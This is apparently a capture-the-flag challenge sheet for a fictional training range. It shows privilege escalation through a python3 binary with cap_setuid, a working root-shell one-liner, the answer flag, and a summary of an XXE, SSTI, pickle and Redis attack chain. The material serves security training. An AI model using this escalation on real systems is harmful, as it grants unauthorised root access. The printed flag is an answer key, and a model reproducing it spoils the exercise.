# Challenge 5 — Privilege Escalation (Final)
## Operation Shadow Forge | Stage 5 of 5
### Machine: aethon-core | Vulnerability: Linux Capability Abuse (cap_setuid)

---

**SITUATION**
You have pivoted to `aethon-core` as `opsadmin`. You are close — the final
F-INSAS blueprint flag is in `/root/flag5.txt` but only readable by root.
Enumerate the host for privilege escalation paths.

**ACCESS**
```bash
ssh opsadmin@aethon-core   # key injected via Redis M4 → M5 path
```

**ENUMERATION STEPS**
```bash
id                          # opsadmin, non-root
sudo -l                     # no sudo
cat /home/opsadmin/NOTICE.txt   # interesting note about python3
getcap -r / 2>/dev/null     # enumerate capabilities on all binaries
```

**YOUR OBJECTIVE**
Discover that `python3` has the `cap_setuid` capability set. Use this to
call `os.setuid(0)` and drop into a root shell, then read the final flag.

**HINTS (unlock after 30 min)**
1. Run: `getcap /usr/bin/python3` — look for `cap_setuid+ep`
2. `cap_setuid` allows a process to call `setuid()` to become any user,
   including root (UID 0), without needing sudo.
3. Exploit:
   ```bash
   python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
   ```

**FULL EXPLOIT**
```bash
# Verify capability
getcap /usr/bin/python3
# /usr/bin/python3 = cap_setuid+ep

# Escalate to root
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# Confirm root
id
# uid=0(root) gid=1001(opsadmin) ...

# Read final flag
cat /root/flag5.txt
```

**WHAT TO SUBMIT**
Flag: `AETHON{c4p4b1l1ty_4bus3_r00t_0wn3d_f1n4l}`

**MISSION COMPLETE**
You have successfully breached AETHON Defense Systems end-to-end:
XXE → SSTI → Pickle RCE → Redis SSH inject → cap_setuid root

---
*Submit all 5 flags to the scoreboard. Operation Shadow Forge: SUCCESS.*
